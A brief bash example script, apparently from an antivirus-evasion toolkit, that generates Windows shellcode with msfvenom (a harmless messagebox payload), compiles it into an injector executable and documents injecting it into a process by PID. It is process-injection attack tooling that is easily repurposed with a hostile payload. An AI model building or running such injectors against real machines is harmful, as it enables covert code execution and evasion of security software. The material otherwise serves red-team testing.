#!/bin/bash          
# example script for injecting shellcode into a process
# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh
# simple messagebox 
msfvenom -p windows/messagebox -b '\x00' -f raw -a x86 --platform Windows > sc.bin
# call make_avet, compile shellcode into the executable
./make_bfg -l -P
# compile 
$win32_compiler -o bfg.exe bfg.c
# cleanup
echo "" > defs.h
# call with bfg.exe sc.bin PID
